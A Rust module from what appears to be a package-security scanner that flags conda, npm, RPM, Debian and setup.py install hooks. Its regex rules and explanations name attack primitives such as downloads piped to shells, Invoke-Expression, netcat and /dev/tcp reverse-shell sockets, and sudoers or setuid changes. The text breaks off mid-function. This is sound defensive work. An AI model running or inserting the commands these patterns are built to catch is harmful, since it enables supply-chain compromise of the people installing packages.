//! Detection and static analysis of conda install-time scripts.
//!
//! Conda packages may ship `post-link`, `pre-link` and `pre-unlink` scripts
//! that the installer executes **as the installing user** at link time. This
//! is arbitrary code execution as a documented part of the format, so every
//! such script is worth a human look. This module finds them by path and runs
//! a small, deliberately narrow set of pattern rules over them.
//!
//! The output is a review queue, not a verdict: rules are tuned so that the
//! common benign script (a symlink, a `mkdir -p $PREFIX/...`, a message
//! appended to `$PREFIX/.messages.txt`) produces zero findings. Comment lines
//! and here-doc bodies are not treated as executable.
//!
//! A hook can also hand a whole program to a second interpreter (`node -e`,
//! `python -c`, `sh -c`), where none of the shell rules can see it. That body
//! is extracted and analysed too — see the *Nested interpreters* section,
//! which also states what that extraction does not reach.

use std::sync::LazyLock;

use regex::Regex;
use sha2::{Digest, Sha256};

/// Which install hook a script implements.
///
/// The conda hooks are files inside the package payload; the npm hooks are
/// string values of `scripts.*` in `package.json`. Both end up executing on
/// the installing machine as the installing user, which is the only property
/// the analysis in this module actually depends on — so they share one type
/// and one rule engine.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum ScriptKind {
    // conda: files in the payload, detected by path.
    PostLink,
    PreLink,
    PreUnlink,
    // npm: `scripts.*` values in package.json. `postinstall` is the single
    // most-used vector in published supply-chain attacks (event-stream,
    // ua-parser-js, node-ipc, coa/rc), and nothing in this codebase looked at
    // it before: `postinstall` appeared exactly once in the backend, in a test
    // fixture written to describe the attack.
    PreInstall,
    Install,
    PostInstall,
    /// npm `prepare` — runs on `npm install` with no arguments and on
    /// `npm pack`, so it executes in more situations than `postinstall` while
    /// attracting less attention.
    Prepare,
    // RPM scriptlets. `%pre`/`%post` run around installation, `%preun`/
    // `%postun` around removal, and all four run as root during a normal
    // `dnf install` — a strictly higher-privilege position than npm or conda,
    // which run as the invoking user.
    RpmPre,
    RpmPost,
    RpmPreUn,
    RpmPostUn,
    // Debian maintainer scripts. Same root-privileged position as RPM.
    DebPreInst,
    DebPostInst,
    DebPreRm,
    DebPostRm,
    // Alpine apk install hooks.
    ApkPreInstall,
    ApkPostInstall,
    /// Python sdist `setup.py` — not a hook in the same sense, but it is
    /// arbitrary code the installer executes to learn what the package even
    /// is, so it holds the same position in the threat model.
    PythonSetupPy,
}

impl ScriptKind {
    /// Stable lowercase wire form, used for the `kind` column and the API.
    pub fn as_str(self) -> &'static str {
        match self {
            ScriptKind::PostLink => "post-link",
            ScriptKind::PreLink => "pre-link",
            ScriptKind::PreUnlink => "pre-unlink",
            ScriptKind::PreInstall => "preinstall",
            ScriptKind::Install => "install",
            ScriptKind::PostInstall => "postinstall",
            ScriptKind::Prepare => "prepare",
            ScriptKind::RpmPre => "rpm-pre",
            ScriptKind::RpmPost => "rpm-post",
            ScriptKind::RpmPreUn => "rpm-preun",
            ScriptKind::RpmPostUn => "rpm-postun",
            ScriptKind::DebPreInst => "deb-preinst",
            ScriptKind::DebPostInst => "deb-postinst",
            ScriptKind::DebPreRm => "deb-prerm",
            ScriptKind::DebPostRm => "deb-postrm",
            ScriptKind::ApkPreInstall => "apk-pre-install",
            ScriptKind::ApkPostInstall => "apk-post-install",
            ScriptKind::PythonSetupPy => "python-setup-py",
        }
    }

    /// True when this hook executes with elevated privilege on a normal
    /// install. RPM scriptlets and Debian maintainer scripts run as root;
    /// npm, conda and Python hooks run as the invoking user. Callers can use
    /// this to weight findings, because the same rule hit is a materially
    /// worse outcome as root.
    pub fn runs_as_root(self) -> bool {
        matches!(
            self,
            ScriptKind::RpmPre
                | ScriptKind::RpmPost
                | ScriptKind::RpmPreUn
                | ScriptKind::RpmPostUn
                | ScriptKind::DebPreInst
                | ScriptKind::DebPostInst
                | ScriptKind::DebPreRm
                | ScriptKind::DebPostRm
                | ScriptKind::ApkPreInstall
                | ScriptKind::ApkPostInstall
        )
    }

    /// Map an npm `scripts.*` key to a kind. Returns `None` for keys that are
    /// not install-time hooks (`test`, `build`, `start`, …): those run only
    /// when a developer asks for them, not as a side effect of installing.
    pub fn from_npm_script_name(name: &str) -> Option<Self> {
        match name {
            "preinstall" => Some(ScriptKind::PreInstall),
            "install" => Some(ScriptKind::Install),
            "postinstall" => Some(ScriptKind::PostInstall),
            "prepare" => Some(ScriptKind::Prepare),
            _ => None,
        }
    }
}

/// Severity of a single finding. Ordered so that `High > Medium > Low > Info`.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, serde::Serialize, serde::Deserialize,
)]
pub enum ScriptSeverity {
    Info,
    Low,
    Medium,
    High,
}

/// A detected install script together with its content.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct InstallScript {
    pub kind: ScriptKind,
    pub path: String,
    pub sha256: String,
    pub body: String,
}

/// One rule hit on one line of an install script.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct ScriptFinding {
    /// Stable kebab-case rule id, e.g. `remote-code-execution`.
    pub rule: String,
    pub severity: ScriptSeverity,
    /// 1-indexed line number in the script body.
    pub line: u32,
    /// The matched line, trimmed and length-capped.
    pub excerpt: String,
    /// One sentence a reviewer can act on.
    pub explanation: String,
}

/// Maximum number of characters kept in a finding excerpt.
const EXCERPT_MAX_CHARS: usize = 200;

macro_rules! re {
    ($name:ident, $pat:expr) => {
        static $name: LazyLock<Regex> = LazyLock::new(|| {
            let pat = $pat;
            let pat: &str = AsRef::<str>::as_ref(&pat);
            Regex::new(pat).expect(concat!("valid regex: ", stringify!($name)))
        });
    };
}

/// Joins pattern fragments (literals and `const &str`s) into one pattern.
macro_rules! concat_re {
    ($($part:expr),+ $(,)?) => {{
        let mut s = String::new();
        $( s.push_str($part); )+
        s
    }};
}

// `bin/.pkg-post-link.sh`, `Scripts/.pkg-pre-unlink.bat`, `post-link.sh`, ...
// The leading dot and the `<pkg>-` prefix both vary, so only the hook name
// and the extension are required.
re!(
    RE_SCRIPT_PATH,
    r"(?i)(?:^|[/\\])\.?(?:[^/\\]*-)?(post-link|pre-link|pre-unlink)\.(?:sh|bat|ps1)$"
);

/// Returns `Some(kind)` if this path is a conda install script.
pub fn classify_script_path(path: &str) -> Option<ScriptKind> {
    let caps = RE_SCRIPT_PATH.captures(path)?;
    match caps[1].to_ascii_lowercase().as_str() {
        "post-link" => Some(ScriptKind::PostLink),
        "pre-link" => Some(ScriptKind::PreLink),
        "pre-unlink" => Some(ScriptKind::PreUnlink),
        _ => None,
    }
}

/// Build an [`InstallScript`] from a detected path and its bytes. Computes the
/// sha256 of the raw bytes. Returns `None` if the path is not an install
/// script or the body is not valid UTF-8 text.
pub fn make_script(path: &str, bytes: &[u8]) -> Option<InstallScript> {
    let kind = classify_script_path(path)?;
    let body = std::str::from_utf8(bytes).ok()?.to_owned();
    Some(InstallScript {
        kind,
        path: path.to_owned(),
        sha256: hex::encode(Sha256::digest(bytes)),
        body,
    })
}

/// Build an [`InstallScript`] from a hook whose body lives in a manifest
/// rather than in a file — an npm `scripts.postinstall` string, for example.
///
/// `location` is a human-readable pointer used as the script's `path`
/// (`package.json#scripts.postinstall`). It carries no `.sh`/`.bat`/`.ps1`
/// suffix, so [`Flavor::from_path`] resolves it to `Shell`, which is what npm
/// runs these through on POSIX. Windows `cmd` differs, but shell rules are the
/// conservative default: they fire on more constructs, and a false positive in
/// a review queue is cheaper than a missed `curl | sh`.
///
/// Unlike [`make_script`] this cannot reject the input for being the wrong
/// kind of path — the caller has already decided what the hook is — so it is
/// infallible for any valid UTF-8 body.
pub fn make_inline_script(kind: ScriptKind, location: &str, body: &str) -> InstallScript {
    InstallScript {
        kind,
        path: location.to_owned(),
        sha256: hex::encode(Sha256::digest(body.as_bytes())),
        body: body.to_owned(),
    }
}

/// Static analysis. Never panics. Deterministic: same input, same output
/// order (ascending line, then fixed rule order).
pub fn analyze_script(script: &InstallScript) -> Vec<ScriptFinding> {
    let flavor = Flavor::from_path(&script.path);
    let mut out = Vec::new();
    let mut heredoc: Option<Heredoc> = None;
    let mut in_block_comment = false;

    // A physical line ending in the flavor's continuation character is joined
    // with the next one, as the shell would do, so that `curl ... \` followed
    // by `| sh` is seen as one command. Findings report the first line.
    let mut pending: Option<(u32, String)> = None;

    for (idx, raw) in script.body.split('\n').enumerate() {
        let line_no = (idx as u32).saturating_add(1);
        let mut raw = raw.strip_suffix('\r').unwrap_or(raw);
        if idx == 0 {
            raw = raw.strip_prefix('\u{feff}').unwrap_or(raw);
        }

        // Inside a here-doc: skip until the terminator, unless the here-doc is
        // being fed to an interpreter, in which case its body *is* code.
        if let Some(hd) = &heredoc {
            let candidate = if hd.strip_tabs {
                raw.trim_start_matches('\t')
            } else {
                raw
            };
            if candidate == hd.delimiter {
                heredoc = None;
                continue;
            }
            if !hd.executable {
                continue;
            }
        }

        let (line_no, joined) = match pending.take() {
            Some((start, mut acc)) => {
                acc.push_str(raw);
                (start, acc)
            }
            None => (line_no, raw.to_owned()),
        };
        if heredoc.is_none() && ends_with_continuation(flavor, &joined) {
            let mut acc = joined;
            acc.pop();
            acc.push(' ');
            pending = Some((line_no, acc));
            continue;
        }

        process_line(
            flavor,
            line_no,
            &joined,
            &mut heredoc,
            &mut in_block_comment,
            &mut out,
        );
    }
    if let Some((line_no, joined)) = pending {
        process_line(
            flavor,
            line_no,
            &joined,
            &mut heredoc,
            &mut in_block_comment,
            &mut out,
        );
    }

    // The same rule hit is a materially worse outcome from a hook the package
    // manager runs as root, so medium-severity findings from RPM/Debian/apk
    // scripts are reported as high. High stays high and Low/Info are not
    // promoted: those are notes, not exposure.
    if script.kind.runs_as_root() {
        for f in &mut out {
            if f.severity == ScriptSeverity::Medium {
                f.severity = ScriptSeverity::High;
            }
        }
    }

    tracing::debug!(
        path = %script.path,
        findings = out.len(),
        "analyzed conda install script"
    );
    out
}

/// Strips comments from one logical line, tracks here-doc starts, and runs
/// the rules over it.
fn process_line(
    flavor: Flavor,
    line_no: u32,
    raw: &str,
    heredoc: &mut Option<Heredoc>,
    in_block_comment: &mut bool,
    out: &mut Vec<ScriptFinding>,
) {
    let code = match flavor {
        Flavor::Shell => strip_hash_comment(raw).to_owned(),
        Flavor::Batch => strip_batch_comment(raw).to_owned(),
        Flavor::PowerShell => {
            let (code, still_in_block) = strip_powershell_comment(raw, *in_block_comment);
            *in_block_comment = still_in_block;
            code
        }
    };
    let code = code.trim();
    if code.is_empty() {
        return;
    }

    // Set before `detect`, so the line that *opens* a here-doc is not itself
    // treated as the interpreter's input.
    let heredoc_lang = heredoc.as_ref().and_then(|h| h.script_lang);
    if flavor == Flavor::Shell && heredoc.is_none() {
        *heredoc = Heredoc::detect(code);
    }

    let mut line_findings = Vec::new();
    check_line(flavor, code, 0, &mut line_findings);
    if let Some(lang) = heredoc_lang {
        // `python <<EOF` feeds this line to an interpreter, so it is embedded
        // code in exactly the same sense as `python -c`.
        check_embedded_code(lang, code, &mut line_findings);
    }
    finalize_line(line_findings, line_no, raw, out);
}

/// `\` (sh), `` ` `` (PowerShell) or `^` (batch) at the very end of a line
/// continues it on the next. A backslash that is itself escaped does not.
fn ends_with_continuation(flavor: Flavor, line: &str) -> bool {
    match flavor {
        Flavor::Shell => {
            let trailing = line.chars().rev().take_while(|&c| c == '\\').count();
            trailing % 2 == 1
        }
        Flavor::PowerShell => line.ends_with('`'),
        Flavor::Batch => line.ends_with('^'),
    }
}

// ---------------------------------------------------------------------------
// Line pre-processing
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Flavor {
    Shell,
    Batch,
    PowerShell,
}

impl Flavor {
    fn from_path(path: &str) -> Self {
        let lower = path.to_ascii_lowercase();
        if lower.ends_with(".bat") || lower.ends_with(".cmd") {
            Flavor::Batch
        } else if lower.ends_with(".ps1") {
            Flavor::PowerShell
        } else {
            Flavor::Shell
        }
    }
}

struct Heredoc {
    delimiter: String,
    strip_tabs: bool,
    /// The here-doc is stdin to an interpreter, so its body is executable.
    executable: bool,
    /// Set when that interpreter is a scripting language, so the body gets
    /// the embedded-code rules as well as the shell ones.
    script_lang: Option<NestedLang>,
}

re!(
    RE_HEREDOC,
    r#"(?:^|[^<])<<(-?)\s*(?:"([^"]+)"|'([^']+)'|\\?([A-Za-z_][A-Za-z0-9_]*))"#
);
re!(
    RE_HEREDOC_INTERP,
    r"(?i)(?:^|[\s;&|(`]|/)(sh|bash|zsh|dash|ksh|fish|python[0-9.]*|perl|ruby|node|nodejs|php|lua|pwsh|powershell|osascript)[\x22']?(?:\s+-\S+)*(?:\s+-)?\s*<<"
);

impl Heredoc {
    fn detect(code: &str) -> Option<Self> {
        let caps = RE_HEREDOC.captures(code)?;
        let delimiter = caps
            .get(2)
            .or_else(|| caps.get(3))
            .or_else(|| caps.get(4))?
            .as_str()
            .to_owned();
        let interp = RE_HEREDOC_INTERP.captures(code);
        let script_lang = interp
            .as_ref()
            .and_then(|c| interpreter_for(&c[1]))
            .map(|i| i.lang)
            .filter(|l| matches!(l, NestedLang::Script | NestedLang::ScriptWithBackticks));
        Some(Heredoc {
            delimiter,
            strip_tabs: !caps[1].is_empty(),
            executable: interp.is_some(),
            script_lang,
        })
    }
}

/// Removes a `#` comment from a shell/PowerShell line, honouring single and
/// double quotes and backslash escapes so that `echo "a # b"` is kept intact.
/// A `#` only starts a comment at the start of the line or after whitespace
/// or a command separator, so `${#var}` and `foo#bar` survive.
fn strip_hash_comment(line: &str) -> &str {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let mut prev: Option<char> = None;
    for (i, c) in line.char_indices() {
        if escaped {
            escaped = false;
            prev = Some(c);
            continue;
        }
        match c {
            '\\' if !in_single => escaped = true,
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '#' if !in_single && !in_double => {
                let starts_comment = matches!(
                    prev,
                    None | Some(' ') | Some('\t') | Some(';') | Some('(') | Some('&') | Some('|')
                );
                if starts_comment {
                    return &line[..i];
                }
            }
            _ => {}
        }
        prev = Some(c);
    }
    line
}

fn strip_batch_comment(line: &str) -> &str {
    let t = line.trim_start();
    if t.starts_with("::") {
        return "";
    }
    let lower = t.get(..4).map(|s| s.to_ascii_lowercase());
    if matches!(lower.as_deref(), Some("rem ") | Some("rem\t")) || t.eq_ignore_ascii_case("rem") {
        return "";
    }
    line
}

/// Handles `#` line comments and `<# ... #>` block comments. Returns the code
/// portion and whether a block comment is still open after this line.
fn strip_powershell_comment(line: &str, in_block: bool) -> (String, bool) {
    let mut out = String::new();
    let mut rest = line;
    let mut in_block = in_block;
    loop {
        if in_block {
            match rest.find("#>") {
                Some(end) => {
                    rest = &rest[end + 2..];
                    in_block = false;
                }
                None => return (out, true),
            }
        } else {
            match rest.find("<#") {
                Some(start) => {
                    out.push_str(&rest[..start]);
                    rest = &rest[start + 2..];
                    in_block = true;
                }
                None => {
                    out.push_str(strip_hash_comment(rest));
                    return (out, false);
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Rules
// ---------------------------------------------------------------------------

const RULE_RCE: &str = "remote-code-execution";
const RULE_EGRESS: &str = "network-egress";
const RULE_WRITES: &str = "writes-outside-prefix";
const RULE_PRIV: &str = "privilege-change";
const RULE_CRED: &str = "credential-access";
const RULE_OBFUSCATION: &str = "obfuscation";
const RULE_PERSISTENCE: &str = "persistence";

/// A rule hit before it is attached to a line.
struct Hit {
    rule: &'static str,
    severity: ScriptSeverity,
    explanation: &'static str,
}

fn hit(rule: &'static str, severity: ScriptSeverity, explanation: &'static str) -> Hit {
    Hit {
        rule,
        severity,
        explanation,
    }
}

/// Runs every rule over one comment-stripped line.
///
/// Message text (`echo "run this with sudo"`) is inert, so most rules see a
/// copy of the line with those arguments blanked out. Obfuscation runs on
/// the original because an encoded blob is a signal wherever it sits.
///
/// `depth` is how many interpreter invocations deep this line already is;
/// it bounds [`check_nested_interpreters`].
fn check_line(flavor: Flavor, code: &str, depth: usize, out: &mut Vec<Hit>) {
    let masked = mask_message_args(code);
    let m = masked.as_str();
    check_remote_code_execution(m, out);
    check_network_egress(m, out);
    check_privilege_change(m, out);
    check_credential_access(m, out);
    check_obfuscation(flavor, code, out);
    check_persistence(m, out);
    check_writes_outside_prefix(flavor, m, out);
    // Last, so that a hit from the outer line wins the per-rule de-duplication
    // in `finalize_line` and keeps its more specific explanation.
    check_nested_interpreters(flavor, m, depth, out);
}

const MESSAGE_COMMANDS: &[&str] = &[
    "echo",
    "printf",
    "print",
    "write-host",
    "write-output",
    "write-warning",
    "write-error",
    "write-verbose",
    "write-information",
    "msg",
];

/// If the first command on the line only prints text, blanks that text.
///
/// Kept verbatim: the command word, `$VAR` / `${...}` references, `$(...)`
/// and backtick substitutions, redirection operators and their targets, and
/// everything after the first unquoted `|`, `;` or `&`. Everything else in
/// the print command's argument list is replaced with spaces.
fn mask_message_args(code: &str) -> String {
    let first_word = code
        .trim_start_matches(|c: char| c.is_whitespace() || c == '"' || c == '\'')
        .split(|c: char| c.is_whitespace() || c == '"' || c == '\'')
        .next()
        .unwrap_or("");
    let first_word = first_word.rsplit(['/', '\\']).next().unwrap_or(first_word);
    if !MESSAGE_COMMANDS.contains(&first_word.to_ascii_lowercase().as_str()) {
        return code.to_owned();
    }

    let chars: Vec<char> = code.chars().collect();
    let mut out = String::with_capacity(code.len());
    let mut i = 0;
    // Skip the command word itself.
    while i < chars.len() && !chars[i].is_whitespace() {
        out.push(chars[i]);
        i += 1;
    }
    let mut in_single = false;
    let mut in_double = false;
    let mut subst_depth = 0usize;
    let mut in_backtick = false;
    let mut keep_next_token = false;
    while i < chars.len() {
        let c = chars[i];
        let quoted = in_single || in_double;
        // End of the print command: emit the rest of the line untouched.
        if !quoted
            && subst_depth == 0
            && !in_backtick
            && matches!(c, '|' | ';' | '&')
            && !keep_next_token
        {
            // `&>` and `>&` are redirections, not separators.
            let is_redirect = c == '&' && chars.get(i + 1) == Some(&'>');
            if !is_redirect {
                out.extend(chars[i..].iter());
                return out;
            }
        }
        if c == '\'' && !in_double && subst_depth == 0 && !in_backtick {
            in_single = !in_single;
            out.push(' ');
            i += 1;
            continue;
        }
        if c == '"' && !in_single {
            in_double = !in_double;
            out.push(' ');
            i += 1;
            continue;
        }
        if !in_single {
            if c == '$' && chars.get(i + 1) == Some(&'(') {
                subst_depth += 1;
                out.push('$');
                out.push('(');
                i += 2;
                continue;
            }
            if c == '$' {
                // `$NAME` or `${...}` reference: keep it whole.
                out.push('$');
                i += 1;
                if chars.get(i) == Some(&'{') {
                    while i < chars.len() && chars[i] != '}' {
                        out.push(chars[i]);
                        i += 1;
                    }
                    if i < chars.len() {
                        out.push('}');
                        i += 1;
                    }
                } else {
                    while i < chars.len()
                        && (chars[i].is_alphanumeric() || chars[i] == '_' || chars[i] == ':')
                    {
                        out.push(chars[i]);
                        i += 1;
                    }
                }
                continue;
            }
            if c == '`' {
                in_backtick = !in_backtick;
                out.push(c);
                i += 1;
                continue;
            }
            if c == '%' {
                // `%NAME%` (batch) reference: keep it whole.
                let end = chars[i + 1..]
                    .iter()
                    .position(|&t| t == '%')
                    .map(|off| i + 1 + off);
                if let Some(end) = end {
                    if chars[i + 1..end]
                        .iter()
                        .all(|t| t.is_alphanumeric() || *t == '_' || *t == '(' || *t == ')')
                    {
                        out.extend(chars[i..=end].iter());
                        i = end + 1;
                        continue;
                    }
                }
            }
            if subst_depth > 0 {
                if c == '(' {
                    subst_depth += 1;
                } else if c == ')' {
                    subst_depth -= 1;
                }
                out.push(c);
                i += 1;
                continue;
            }
            if in_backtick {
                out.push(c);
                i += 1;
                continue;
            }
        }
        if !quoted && (c == '>' || c == '<') {
            keep_next_token = true;
            out.push(c);
            i += 1;
            continue;
        }
        if keep_next_token {
            if c.is_whitespace() && !quoted {
                out.push(c);
                i += 1;
                continue;
            }
            // Copy the target token through to its end.
            let mut q_single = false;
            let mut q_double = false;
            while i < chars.len() {
                let t = chars[i];
                if t == '\'' && !q_double {
                    q_single = !q_single;
                } else if t == '"' && !q_single {
                    q_double = !q_double;
                } else if !q_single
                    && !q_double
                    && (t.is_whitespace() || matches!(t, '|' | ';' | '&'))
                {
                    break;
                }
                out.push(t);
                i += 1;
            }
            keep_next_token = false;
            continue;
        }
        out.push(if c.is_whitespace() { c } else { ' ' });
        i += 1;
    }
    out
}

/// Applies specific-over-generic suppression, de-duplicates by rule and turns
/// hits into findings.
fn finalize_line(hits: Vec<Hit>, line_no: u32, raw: &str, out: &mut Vec<ScriptFinding>) {
    let has = |rule: &str| hits.iter().any(|h| h.rule == rule);
    let rce = has(RULE_RCE);
    let specific_write = has(RULE_PERSISTENCE) || has(RULE_CRED);
    let mut seen: Vec<&str> = Vec::new();
    for h in hits {
        if (h.rule == RULE_EGRESS && rce) || (h.rule == RULE_WRITES && specific_write) {
            continue;
        }
        if seen.contains(&h.rule) {
            continue;
        }
        seen.push(h.rule);
        out.push(ScriptFinding {
            rule: h.rule.to_owned(),
            severity: h.severity,
            line: line_no,
            excerpt: excerpt(raw),
            explanation: h.explanation.to_owned(),
        });
    }
}

fn excerpt(raw: &str) -> String {
    let trimmed = raw.trim();
    let mut s: String = trimmed.chars().take(EXCERPT_MAX_CHARS).collect();
    if trimmed.chars().nth(EXCERPT_MAX_CHARS).is_some() {
        s.push('…');
    }
    s
}

// Shared fragments. Kept as `const &str` so patterns can be composed with
// `concat!`.
const DOWNLOADER: &str = r"(?:curl|wget|fetch|aria2c|iwr|irm|Invoke-WebRequest|Invoke-RestMethod|Start-BitsTransfer|certutil(?:\.exe)?|bitsadmin(?:\.exe)?)";
const INTERP: &str = r"(?:sh|bash|zsh|dash|ksh|fish|python[0-9.]*|perl|ruby|node|nodejs|php|lua|pwsh|powershell(?:\.exe)?|cmd(?:\.exe)?|iex|Invoke-Expression)";
/// Start-of-command context: line start, a separator, or a wrapper command.
const CMD_START: &str = r"(?:^|[;&|(`]|\$\(|\b(?:sudo|doas|exec|env|nohup|command|time|xargs|nice|builtin|then|do|else|if|elif|while|until)\s+)\s*[\x22']?(?:[\w${}%:./~\\-]*[/\\])?";
/// End of a command name: an optional closing quote, then whitespace, end of
/// line, or a separator.
const CMD_END: &str = r"[\x22']?(?:\s|$|[;&|)])";

// ----- remote-code-execution -----------------------------------------------

// A pipeline that starts with a downloader and ends in an interpreter.
re!(
    RE_RCE_PIPE,
    concat_re!(
        r"(?i)\b",
        DOWNLOADER,
        r"\b[^|]*(?:\|[^|]*)*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:\S*/)?",
        INTERP,
        r"\b"
    )
);
// `bash -c "$(curl ...)"`, `sh <(curl ...)`, `eval "$(wget ...)"`, `. <(curl ...)`.
re!(
    RE_RCE_SUBST,
    concat_re!(
        r"(?i)(?:\b(?:sh|bash|zsh|dash|ksh|eval|source|exec)|(?:^|[\s;&|(])\.)\s+(?:-[a-z]+\s+)*[\x22']?(?:\$\(|`|<\()\s*",
        DOWNLOADER,
        r"\b"
    )
);
// PowerShell eval.
re!(
    RE_RCE_IEX,
    r"(?i)\bInvoke-Expression\b|\|\s*iex\b|\biex\s*[(\$\x22']|\[scriptblock\]::Create\s*\("
);
// Inline Python/Ruby/etc that fetches and exec()s.
re!(
    RE_RCE_FETCH_EXEC,
    r"(?i)\b(?:urllib|urlopen|requests\.(?:get|post)|http\.client|WebClient|HttpClient|Net::HTTP)\b.*\b(?:exec|eval|instance_eval)\s*\("
);

fn check_remote_code_execution(code: &str, out: &mut Vec<Hit>) {
    if RE_RCE_PIPE.is_match(code) {
        out.push(hit(
            RULE_RCE,
            ScriptSeverity::High,
            "Pipes downloaded content straight into an interpreter; whatever the remote host serves at install time is executed as the installing user.",
        ));
    } else if RE_RCE_SUBST.is_match(code) {
        out.push(hit(
            RULE_RCE,
            ScriptSeverity::High,
            "Executes the output of a download via command or process substitution; the code that runs is whatever the remote host serves at install time.",
        ));
    } else if RE_RCE_IEX.is_match(code) {
        out.push(hit(
            RULE_RCE,
            ScriptSeverity::High,
            "Invoke-Expression evaluates a string as PowerShell; combined with any download or decoding this runs code that is not visible in the package.",
        ));
    } else if RE_RCE_FETCH_EXEC.is_match(code) {
        out.push(hit(
            RULE_RCE,
            ScriptSeverity::High,
            "Inline interpreter code fetches from the network and passes the result to exec()/eval().",
        ));
    }
}

// ----- network-egress ------------------------------------------------------

re!(
    RE_EGRESS_TOOL,
    concat_re!(
        r"(?i)",
        CMD_START,
        r"(curl|wget|fetch|aria2c|nc|ncat|netcat|socat|telnet|ftp|tftp|scp|sftp|rsync|ssh|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Start-BitsTransfer|bitsadmin(?:\.exe)?|Test-NetConnection|nslookup|dig|mail|mailx|sendmail|Send-MailMessage)",
        CMD_END
    )
);
re!(
    RE_EGRESS_CERTUTIL,
    r"(?i)\bcertutil(?:\.exe)?\b[^|;&]*-urlcache\b"
);
re!(RE_EGRESS_DEVTCP, r"/dev/(?:tcp|udp)/");
re!(
    RE_EGRESS_PRIMITIVE,
    r"(?i)\b(?:New-Object\s+(?:System\.)?Net\.(?:WebClient|Sockets\.TcpClient)|DownloadString|DownloadFile|DownloadData|\[System\.Net\.WebClient\]|System\.Net\.Http|Net\.Sockets\.|urllib\.request|urllib\.urlopen|urlopen\(|urlretrieve\(|requests\.(?:get|post|put)\(|http\.client\.HTTPS?Connection|socket\.socket\(|socket\.create_connection\(|Net::HTTP|LWP::|HTTParty)"
);
re!(
    RE_EGRESS_PKG,
    concat_re!(
        r"(?i)",
        CMD_START,
        r"(?:pip[0-9.]*|python[0-9.]*[\x22']?\s+-m\s+pip|conda|mamba|micromamba|npm|pnpm|yarn|gem|cargo|go|apt(?:-get)?|yum|dnf|zypper|apk|brew|choco|winget|nuget|R)[\x22']?\s+(?:-\S+\s+)*(?:install|get|add|clone|update|upgrade|download|fetch|sync|create)\b|\bgit\s+(?:-C\s+\S+\s+)?(?:clone|fetch|pull|submodule\s+update)\b|\binstall\.packages\s*\(|\b(?:remotes|devtools)::install_|\bBiocManager::install\s*\("
    )
);
re!(RE_PIP_NO_INDEX, r"(?i)\bpip[0-9.]*\b.*--no-index\b");
re!(
    RE_IP_PORT,
    r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{2,5})\b"
);
re!(
    RE_IP_URL,
    r"(?i)\b(?:https?|ftp)://(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
);

fn is_loopback_ip(ip: &str) -> bool {
    ip.starts_with("127.") || ip == "0.0.0.0"
}

fn check_network_egress(code: &str, out: &mut Vec<Hit>) {
    if let Some(caps) = RE_EGRESS_TOOL.captures(code) {
        let tool = caps[1].to_ascii_lowercase();
        let after = &code[caps.get(1).map(|m| m.end()).unwrap_or(0)..];
        // rsync/scp without a `host:` spec are local copies.
        let local_copy = matches!(tool.as_str(), "rsync" | "scp") && !after.contains(':');
        if !local_copy {
            out.push(hit(
                RULE_EGRESS,
                ScriptSeverity::Medium,
                "Runs a network client at install time; confirm what is fetched or sent and whether the package really needs network access to install.",
            ));
            return;
        }
    }
    if RE_EGRESS_CERTUTIL.is_match(code) || RE_EGRESS_PRIMITIVE.is_match(code) {
        out.push(hit(
            RULE_EGRESS,
            ScriptSeverity::Medium,
            "Uses a network API or download primitive at install time; confirm what is fetched or sent.",
        ));
        return;
    }
    if RE_EGRESS_DEVTCP.is_match(code) {
        out.push(hit(
            RULE_EGRESS,
            ScriptSeverity::Medium,
            "Opens a raw TCP/UDP socket via /dev/tcp; this is a common reverse-shell primitive and has no legitimate install-time use.",
        ));
        return;
    }
    if RE_EGRESS_PKG.is_match(code) && !RE_PIP_NO_INDEX.is_match(code) {
        out.push(hit(
            RULE_EGRESS,
            ScriptSeverity::Medium,
            "Invokes a package manager or git at install time, which fetches and may execute unpinned code from the network.",
        ));
        return;
    }
    let ip_hit = RE_IP_PORT
        .captures(code)
        .map(|c| c[1].to_owned())
        .or_else(|| RE_IP_URL.captures(code).map(|c| c[1].to_owned()));
    if let Some(ip) = ip_hit {
        if !is_loopback_ip(&ip) {
            out.push(hit(
                RULE_EGRESS,
                ScriptSeverity::Medium,
                "References a raw IP address with a port or URL; hard-coded endpoints are typical of exfiltration or reverse-shell payloads.",
            ));
        }
    }
}

// ----- privilege-change ----------------------------------------------------

re!(
    RE_PRIV_ESCALATE,
    concat_re!(
        r"(?i)",
        r"(?:^|[\s;&|(`])(?:sudo|doas|pkexec|gsudo)(?:\s|$)|(?:^|[\s;&|(`])su\s+(?:-|root\b)|(?:^|[\s;&|(`])runas(?:\.exe)?\s|-Verb\s+RunAs\b"
    )
);
re!(
    RE_PRIV_SETUID,
    r"\bchmod\s+(?:-\S+\s+)*(?:[ugoa]*\+[rwxXt]*s|[2467][0-7]{3})\b|\bset(?:u|g)id\b|\bsetcap\s"
);
re!(
    RE_PRIV_CHOWN,
    r"\bchown\s+(?:-\S+\s+)*(?:root|0)(?:[:.\s]|$)|\bchown\s+(?:-\S+\s+)*\S*[:.](?:root|wheel|0)(?:\s|$)|\bchgrp\s+(?:-\S+\s+)*(?:root|wheel)(?:\s|$)"
);
re!(
    RE_PRIV_WINDOWS,
    r"(?i)\bnet(?:\.exe)?\s+(?:user|localgroup)\b.*/add\b|/etc/sudoers\b|\bicacls\b.*/grant\b.*\b(?:everyone|users)\b"
);

re!(
    RE_EXISTENCE_CHECK,
    r"\b(?:command\s+-v|which|type|hash|Get-Command|gcm)\s+(?:sudo|doas|pkexec|gsudo|su|runas)\b"
);

fn check_privilege_change(code: &str, out: &mut Vec<Hit>) {
    let without_checks = RE_EXISTENCE_CHECK.replace_all(code, "");
    if RE_PRIV_ESCALATE.is_match(&without_checks) {
        out.push(hit(
            RULE_PRIV,
            ScriptSeverity::High,
